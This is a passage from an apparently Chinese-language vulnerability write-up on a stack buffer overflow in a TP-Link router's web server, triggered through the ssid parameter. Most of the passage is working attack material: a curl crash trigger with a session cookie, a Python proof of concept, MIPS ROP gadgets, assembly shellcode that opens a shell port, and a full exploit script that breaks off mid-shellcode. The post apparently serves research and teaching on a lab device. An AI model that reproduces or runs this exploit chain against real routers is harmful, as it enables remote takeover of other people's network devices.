class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        uStack3400 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pcVar9 = (<span class="keyword">char</span> *)httpGetEnv(param_1,&amp;DAT_00548140);</span><br><span class="line">    <span class="keyword">if</span> (pcVar9 != (<span class="keyword">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      iStack3396 = atoi(pcVar9);</span><br><span class="line">    &#125;</span><br><span class="line">    httpPrintf(param_1,</span><br><span class="line">               <span class="string">&quot;&lt;SCRIPT language=\&quot;javascript\&quot; type=\&quot;text/javascript\&quot;&gt;\nvar %s = new Array(\n&quot;</span>,</span><br><span class="line">               <span class="string">&quot;pagePara&quot;</span>);</span><br><span class="line">    writePageParamSet(param_1,&amp;DAT_00544d38,acStack3460,<span class="number">0</span>);</span><br><span class="line">    writePageParamSet(param_1,<span class="string">&quot;%d,&quot;</span>,&amp;uStack3424,<span class="number">1</span>);</span><br><span class="line">    writePageParamSet(param_1,<span class="string">&quot;%d,&quot;</span>,&amp;uStack3420,<span class="number">2</span>);</span><br><span class="line">    writePageParamSet(param_1,<span class="string">&quot;%d,&quot;</span>,&amp;uStack3416,<span class="number">3</span>);</span><br><span class="line">    writePageParamSet(param_1,<span class="string">&quot;%d,&quot;</span>,&amp;uStack3412,<span class="number">4</span>);</span><br><span class="line">    writePageParamSet(param_1,<span class="string">&quot;%d,&quot;</span>,&amp;uStack3408,<span class="number">5</span>);</span><br><span class="line">    writePageParamSet(param_1,<span class="string">&quot;%d,&quot;</span>,&amp;uStack3404,<span class="number">6</span>);</span><br><span class="line">    writePageParamSet(param_1,<span class="string">&quot;%d,&quot;</span>,&amp;uStack3400,<span class="number">7</span>);</span><br><span class="line">    writePageParamSet(param_1,<span class="string">&quot;%d,&quot;</span>,&amp;iStack3396,<span class="number">8</span>);</span><br><span class="line">    httpPrintf(param_1,<span class="string">&quot;0,0 );\n&lt;/SCRIPT&gt;\n&quot;</span>);</span><br><span class="line">    httpPrintf(param_1,<span class="string">&quot;&lt;script language=JavaScript&gt;\nvar isInScanning = 0;\n&lt;/script&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ((auStack3600[<span class="number">0</span>] &lt; <span class="number">9</span>) &amp;&amp; ((<span class="number">1</span> &lt;&lt; (auStack3600[<span class="number">0</span>] &amp; <span class="number">0x1f</span>) &amp; <span class="number">0x1c8</span>U) != <span class="number">0</span>)) &#123;</span><br><span class="line">      HttpWebV4Head(param_1,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">      pcVar9 = <span class="string">&quot;/userRpm/popupSiteSurveyRpm_AP.htm&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      HttpWebV4Head(param_1,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">      pcVar9 = <span class="string">&quot;/userRpm/popupSiteSurveyRpm.htm&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar1 = httpRpmFsA(param_1,pcVar9);</span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sVar10 = HttpErrorPage(param_1,<span class="number">10</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">LAB_0045fa54:</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">int</span>)sVar10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们使用curl发送HTTP请求给我们的路由器，测试漏洞是否存在。为了能够访问存在漏洞的服务，我们首先需要登陆，即我们需要抓取登陆后的<strong>Cookie</strong>（此处为*%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D<em>）和*<em>path</em></em>(此处为<em>MKSRWOTBRLXMCITC</em>)，然后作为发送参数。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202021-01-24%20%E4%B8%8B%E5%8D%885.07.16.png" alt="屏幕快照2021-01-24下午5.07.16"></p>
<p>使用curl来写入我们的payload，httpd发生段错误，并且程序控制流呗控制为0x61656161</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &#x27;Cookie: Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D&#x27; &#x27;http://10.211.55.8/YEHFDFSAMIIOATRA/userRpm/popupSiteSurveyRpm_AP.htm?mode=1000&amp;curRegion=1000&amp;chanWidth=100&amp;channel=1000&amp;ssid=&#x27;$(python -c &#x27;print( &quot;/%0A&quot;*0x55 + &quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac&quot;)&#x27;)&#x27;&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/BjxYEt.png" alt="BjxYEt"></p>
<p>很明显缓冲区溢出发生在函数writePageParamSet，并且在其返回的时候劫持了函数执行流。最后lw了四个寄存器ra,s2,s1,s1,s0，通过这个可以辅助判断我们发生溢出的大概位置。执行之后sp会加0x288，当然这条指令是在跳转之前执行的，因为指令流水线。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/VXIyPL.png" alt="VXIyPL"></p>
<p>另外一边，我们看到页面打印出大量的<code>&lt;/br&gt;</code>，也验证了我们之前的代码审计，writePageParamSet是将输入的数据写入Javascript的Param对象中。同时也通过1位字节换4位字节的方式写入超出界限的数据，如果要修补这个漏洞也很简单，只需要将缓冲区扩大四倍就行了，或者修改stringModify，让产生<code>&lt;/br&gt;</code>的时候指针size+4而不是size+1。</p>
<p>经过计算payload每一位应为<em><em>0x55</em>“&#x2F;%0A”+2+s0+s1+s2+ra</em>*</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202021-01-24%20%E4%B8%8B%E5%8D%887.18.26.png" alt="屏幕快照2021-01-24下午7.18.26"></p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/m8NPuH.png" alt="m8NPuH"></p>
<p>在溢出区域出放置地址我们就能够成功控制程序流。让我们用python实现一下poc.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> socks</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">default_socket = socket.socket</span><br><span class="line">socket.socket = socks.socksocket</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.verify = <span class="literal">False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">path,cookie</span>):</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;Authorization=Basic&#123;cookie&#125;&quot;</span>.<span class="built_in">format</span>(cookie=<span class="built_in">str</span>(cookie))&#125;</span><br><span class="line">    payload=<span class="string">&quot;/%0A&quot;</span>*<span class="number">0x55</span> + <span class="string">&quot;abcdefghijklmn&quot;</span>+<span class="string">&quot;\x78\x56\x34\x12&quot;</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;mode&quot;</span>:<span class="string">&quot;1000&quot;</span>,</span><br><span class="line">                <span class="string">&quot;curRegion&quot;</span>:<span class="string">&quot;1000&quot;</span>,</span><br><span class="line">                <span class="string">&quot;chanWidth&quot;</span>:<span class="string">&quot;100&quot;</span>,</span><br><span class="line">                <span class="string">&quot;channel&quot;</span>:<span class="string">&quot;1000&quot;</span>,</span><br><span class="line">                <span class="string">&quot;ssid&quot;</span>:urllib.request.unquote(payload) <span class="comment">#if python3</span></span><br><span class="line">      								<span class="comment">#urllib.unquote(payload) #if python2 (suggest)</span></span><br><span class="line">        &#125;</span><br><span class="line">    url=<span class="string">&quot;http://10.211.55.8:80/&#123;path&#125;/userRpm/popupSiteSurveyRpm_AP.htm&quot;</span>.<span class="built_in">format</span>(path=<span class="built_in">str</span>(path))</span><br><span class="line">    resp = session.get(url,params=params,headers=headers,timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span> (resp.text)</span><br><span class="line"></span><br><span class="line">exp(<span class="string">&quot;AYEUYUFAXVOKELRC&quot;</span>,<span class="string">&quot;%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D&quot;</span>)</span><br></pre></td></tr></table></figure>


<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>接下来让我们为这个漏洞编写一下利用脚本，语言我们使用python2.7。</p>
<p>利用时要注意Mips架构下默认ASLR是不开启的，并且heap和sgack是可执行的，所以直接跳转到shellcode即可。不过由于缓存不一致性，我们需要使用ROP。</p>
<blockquote>
<p>注意Mips是大端的，数据存放方式与小端是相反的。并且在gdb调试后后记得endian为big，否则断点是断不下来的。 </p>
</blockquote>
<p><strong>构造ROP链</strong></p>
<p>Mips指令集包含一种的**<a target="_blank" rel="noopener" href="https://blog.senr.io/blog/why-is-my-perfectly-good-shellcode-not-working-cache-coherency-on-mips-and-arm">cache incoherency(缓存不一致性)</a>**，指令Cache和数据Cache两者的同步需要一个时间来同步。需要调用Sleep来让shellcode从数据Cache刷新到指令Cache，否则会执行失败，不能像x86架构下直接跳转到shellcode，而是需要构造如下一条ROP链接，先调用sleep，然后在跳转到shellcode。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep(1) -&gt; read_value_from_stack -&gt; jump to stack(shellcode)</span><br></pre></td></tr></table></figure>
<p>Mips的栈并没有pop和push，而是直接调用栈，ROP链构造和x86有一些区别，不过总体上逻辑应该是更加简单了，不过gadgets比较难找（因为全是寄存器操作）。</p>
<p>注意的是，pwntools需要专门设置为大端，否则默认小端。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.endian = <span class="string">&#x27;big&#x27;</span> </span><br></pre></td></tr></table></figure>
<p><strong>寻找gadgets</strong></p>
<p>经过上文的分析，我们知道我们能够布置栈，来控制s0～s2和ra寄存器。初始我们将ra覆盖为gadget1，用于修改寄存器$a0，将sleep函数的地址放在s2备用，将gadgets放在s1用于下一次跳转。另外，使用gadgets需要考虑流水线效应。</p>
<p>Gadget1，修改寄存器$a0（作为调用sleep的参数）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000E204                 move    $t9, $s1</span><br><span class="line">LOAD:0000E208                 jalr    $t9 ; sysconf</span><br><span class="line">LOAD:0000E20C                 li      $a0, 3</span><br></pre></td></tr></table></figure>
<p>Gadget2，完成两个功能，1.调用sleep函数，2.跳转到下一个gadgets。首先调用sleep函数（之前存放在s2中），并且结束之后sp会增加0x28字节。在结束之前也会修改ra等寄存器的值，不过这里需要注意的是0x28+var_10($sp)的意思是sp+0x28-0x10地址。（Mips是通过偏移来获得栈内参数的），这里也要先设置好ra的值。调用sleep之后，程序会跳转到ra指向的地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">LOAD:00037470                 move    $t9, $s2</span><br><span class="line">LOAD:00037474                 lw      $ra, 0x28+var_4($sp)</span><br><span class="line">LOAD:00037478                 lw      $s2, 0x28+var_8($sp)</span><br><span class="line">LOAD:0003747C                 lw      $s1, 0x28+var_C($sp)</span><br><span class="line">LOAD:00037480                 lw      $s0, 0x28+var_10($sp)</span><br><span class="line">LOAD:00037484</span><br><span class="line">LOAD:00037484 loc_37484:                               # DATA XREF: xdr_callhdr↓o</span><br><span class="line">LOAD:00037484                 jr      $t9 ; xdr_opaque_auth</span><br><span class="line">LOAD:00037488                 addiu   $sp, 0x28</span><br><span class="line"></span><br><span class="line">#其实这段代码用gdb的反汇编看起来反而更加易懂一些</span><br><span class="line">&#x3D;&gt; 0x77f70470:	move	t9,s2</span><br><span class="line">   0x77f70474:	lw	ra,36(sp)</span><br><span class="line">   0x77f70478:	lw	s2,32(sp)</span><br><span class="line">   0x77f7047c:	lw	s1,28(sp)</span><br><span class="line">   0x77f70480:	lw	s0,24(sp)</span><br><span class="line">   0x77f70484:	jr	t9</span><br><span class="line">   0x77f70488:	addiu	sp,sp,40</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Gadget3，用于将栈底地址写入a1，即我们布置的shellcode的地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000E904                 addiu   $a1, $sp, 0x168+var_150</span><br><span class="line">LOAD:0000E908                 move    $t9, $s1</span><br><span class="line">LOAD:0000E90C                 jalr    $t9 ; stat64</span><br><span class="line">LOAD:0000E910                 addiu   $a0, (aErrorNetrcFile+0x28 - 0x60000)</span><br></pre></td></tr></table></figure>
<p>Gadget4，跳转到shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LOAD:000374D8                 move    $t9, $a1</span><br><span class="line">LOAD:000374DC                 sw      $v0, 0x4C($a0)</span><br><span class="line">LOAD:000374E0                 move    $a1, $a2</span><br><span class="line">LOAD:000374E4                 jr      $t9</span><br><span class="line">LOAD:000374E8                 addiu   $a0, 0x4C  # &#39;L&#39;</span><br></pre></td></tr></table></figure>
<p><strong>调试问题解决：</strong></p>
<p>我们写入到payload的地址数据被转义，导致无法跳转？<code>0x77f47204</code>中的f被转义成了c3b。也有可能是python在发送时候把\f转义了，这个问题我换成python2之后就解决了</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/JCy0l6.png" alt="JCy0l6"></p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/x8cPtV.png" alt="x8cPtV"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> socks</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">default_socket = socket.socket</span><br><span class="line">socket.socket = socks.socksocket</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.verify = <span class="literal">False</span></span><br><span class="line">context.endian = <span class="string">&#x27;big&#x27;</span> </span><br><span class="line">libc_base=<span class="number">0x77f39000</span> </span><br><span class="line">li_a0=<span class="number">0x000E204</span> <span class="comment">#0x77F47204</span></span><br><span class="line">jar_t9=<span class="number">0x00045238</span> <span class="comment">#0x77f7e238</span></span><br><span class="line"></span><br><span class="line">payload= <span class="string">&quot;/%0A&quot;</span>*<span class="number">0x55</span> + <span class="string">&quot;abcdefghijklmn&quot;</span></span><br><span class="line">payload+=p32(<span class="number">0x77f7e238</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">path,cookie</span>):</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&quot;</span>,</span><br><span class="line">                <span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;Authorization=Basic&#123;cookie&#125;&quot;</span>.<span class="built_in">format</span>(cookie=<span class="built_in">str</span>(cookie))&#125;</span><br><span class="line"></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;mode&quot;</span>:<span class="string">&quot;1000&quot;</span>,</span><br><span class="line">                <span class="string">&quot;curRegion&quot;</span>:<span class="string">&quot;1000&quot;</span>,</span><br><span class="line">                <span class="string">&quot;chanWidth&quot;</span>:<span class="string">&quot;100&quot;</span>,</span><br><span class="line">                <span class="string">&quot;channel&quot;</span>:<span class="string">&quot;1000&quot;</span>,</span><br><span class="line">                <span class="string">&quot;ssid&quot;</span>:urllib.unquote(payload)</span><br><span class="line">        &#125;</span><br><span class="line">    url=<span class="string">&quot;http://10.211.55.8:80/&#123;path&#125;/userRpm/popupSiteSurveyRpm_AP.htm&quot;</span>.<span class="built_in">format</span>(path=<span class="built_in">str</span>(path))</span><br><span class="line">    resp = session.get(url,params=params,headers=headers,timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span> (resp.text)</span><br><span class="line"></span><br><span class="line">exp(<span class="string">&quot;SZJVVFBANECQPKOC&quot;</span>,<span class="string">&quot;%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>shellcode(连接本地9999端口)</strong></p>
<p>因为我们的数据\c3会被转义，一种方式是指令替换，另一种方式是指令逃逸。shellcode<a target="_blank" rel="noopener" href="http://www.tearorca.top/index.php/2020/04/21/cve-2020-8423tplink-wr841n-%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA">参考地址</a>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">main:</span><br><span class="line"> addiu $t6,$zero,-3 </span><br><span class="line"> nor $a0,$t6,$zero #addi $a0,$zero,2 </span><br><span class="line"> nor $a1,$t6,$zero #addi $a1,$zero,2 </span><br><span class="line"> slti $a2,$zero,-1 #lui $a2,0 </span><br><span class="line"></span><br><span class="line"> addiu $v0,$zero,4183 </span><br><span class="line"> syscall 0x40404 </span><br><span class="line"> sw $v0,-1($sp) </span><br><span class="line">  </span><br><span class="line"> lw $a0,-1($sp) </span><br><span class="line"> li $t6,0xFFFF </span><br><span class="line"> nor $t6,$t6,$zero  #lui $t6,0 </span><br><span class="line"> sw $t6,-10($sp) </span><br><span class="line"> sw $t6,-12($sp) </span><br><span class="line"></span><br><span class="line"> #bind(serverfd,(struct sockaddr *)&amp;amp;server,sizeof(server)); </span><br><span class="line"> li $t7,0xD8F0 </span><br><span class="line"> nor $t7,$t7,$zero </span><br><span class="line"> sw $t7,-14($sp) </span><br><span class="line"> li $t7,0xFFFD </span><br><span class="line"> nor $t7,$t7,$zero;#lui $t7,0x2;ori $t7,0x270F  </span><br><span class="line"> sw $t7,-16($sp) </span><br><span class="line"></span><br><span class="line"> addiu $a1,$sp,-14 </span><br><span class="line"> addiu $t7,$zero,-17 </span><br><span class="line"> nor $a2,$t7,$zero #li $a2,16 </span><br><span class="line"></span><br><span class="line"> addiu $v0,$zero,4170 </span><br><span class="line"> syscall 0x40404 </span><br><span class="line"> lw $a0,-1($sp)</span><br><span class="line"> slti $a1,$zero,-1 #li $a1,0</span><br><span class="line"> addiu $v0,$zero,4063</span><br><span class="line"> syscall 0x40404</span><br><span class="line"> sltiu $a1,$zero,-1 #li $a1,1</span><br><span class="line"> addiu $v0,$zero,4063</span><br><span class="line"> syscall 0x40404</span><br><span class="line"> </span><br><span class="line"> addiu $t6,$zero,-3</span><br><span class="line"> nor $a1,$t6,$zero #li $a1,2</span><br><span class="line"> addiu $v0,$zero,4063</span><br><span class="line"> syscall 0x40404</span><br><span class="line"> li $t6,0x3d28   #0x77f93d28是&#x2F;bin&#x2F;sh字符串所在的地址</span><br><span class="line"> sw $t6,-30($sp)</span><br><span class="line"> li $t6,0x77f9</span><br><span class="line"> sw $t6,-32($sp)</span><br><span class="line"> </span><br><span class="line"> lw $a0,-30($sp)                     </span><br><span class="line"> slti $a1,$zero,-1</span><br><span class="line"> slti $a2,$zero,-1</span><br><span class="line"> addiu $v0,$zero,4011        </span><br><span class="line"> syscall 0x40404</span><br></pre></td></tr></table></figure>
<p><strong>Exploit</strong></p>
<p>编写好explioit，最后这个shellcode的内容是反弹到本地的9999端口，在本地用nc连接一下即可。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/6LuIAo.png" alt="6LuIAo"></p>
<p><strong>EXP.py</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> socks</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">default_socket = socket.socket</span><br><span class="line">socket.socket = socks.socksocket</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.verify = <span class="literal">False</span></span><br><span class="line">context.endian = <span class="string">&#x27;big&#x27;</span> </span><br><span class="line">libc_base=<span class="number">0x77f39000</span> </span><br><span class="line">sleep =<span class="number">0x53CA0</span> <span class="comment">#end 00053ECC</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gadgets</span></span><br><span class="line">g1=<span class="number">0x000E204</span> <span class="comment">#0x77F47204</span></span><br><span class="line"><span class="comment">#LOAD:0000E204                 move    $t9, $s1</span></span><br><span class="line"><span class="comment">#LOAD:0000E208                 jalr    $t9 ; sysconf</span></span><br><span class="line"><span class="comment">#LOAD:0000E20C                 li      $a0, 3</span></span><br><span class="line">g2=<span class="number">0x00037470</span></span><br><span class="line"><span class="comment">#LOAD:00037470                 move    $t9, $s2</span></span><br><span class="line"><span class="comment">#LOAD:00037474                 lw      $ra, 0x28+var_4($sp)</span></span><br><span class="line"><span class="comment">#LOAD:00037478                 lw      $s2, 0x28+var_8($sp)</span></span><br><span class="line"><span class="comment">#LOAD:0003747C                 lw      $s1, 0x28+var_C($sp)</span></span><br><span class="line"><span class="comment">#LOAD:00037480                 lw      $s0, 0x28+var_10($sp)</span></span><br><span class="line"><span class="comment">#LOAD:00037484</span></span><br><span class="line"><span class="comment">#LOAD:00037484 loc_37484:</span></span><br><span class="line"><span class="comment">#LOAD:00037484                 jr      $t9 ; xdr_opaque_auth</span></span><br><span class="line"><span class="comment">#LOAD:00037488                 addiu   $sp, 0x28</span></span><br><span class="line">g3=<span class="number">0x0000E904</span> <span class="comment">#0x77f47904</span></span><br><span class="line"><span class="comment">#LOAD:0000E904                 addiu   $a1, $sp, 0x168+var_150</span></span><br><span class="line"><span class="comment">#LOAD:0000E908                 move    $t9, $s1</span></span><br><span class="line"><span class="comment">#LOAD:0000E90C                 jalr    $t9 ; stat64</span></span><br><span class="line"><span class="comment">#LOAD:0000E910                 addiu   $a0, (aErrorNetrcFile+0x28 - 0x60000)</span></span><br><span class="line">g4=<span class="number">0x00374D8</span></span><br><span class="line"><span class="comment">#LOAD:000374D8                 move    $t9, $a1</span></span><br><span class="line"><span class="comment">#LOAD:000374DC                 sw      $v0, 0x4C($a0)</span></span><br><span class="line"><span class="comment">#LOAD:000374E0                 move    $a1, $a2</span></span><br><span class="line"><span class="comment">#LOAD:000374E4                 jr      $t9</span></span><br><span class="line"><span class="comment">#LOAD:000374E8                 addiu   $a0, 0x4C  # &#x27;L&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&quot;\x24\x0e\xff\xfd\x01\xc0\x20\x27\x01\xc0\x28\x27\x28\x06\xff\xff&quot;</span></span><br><span class="line">shellcode+=<span class="string">&quot;\x24\x02\x10\x57\x01\x01\x01\x0c\xaf\xa2\xff\xff\x8f\xa4\xff\xff&quot;</span></span><br><span class="line">shellcode+=<span 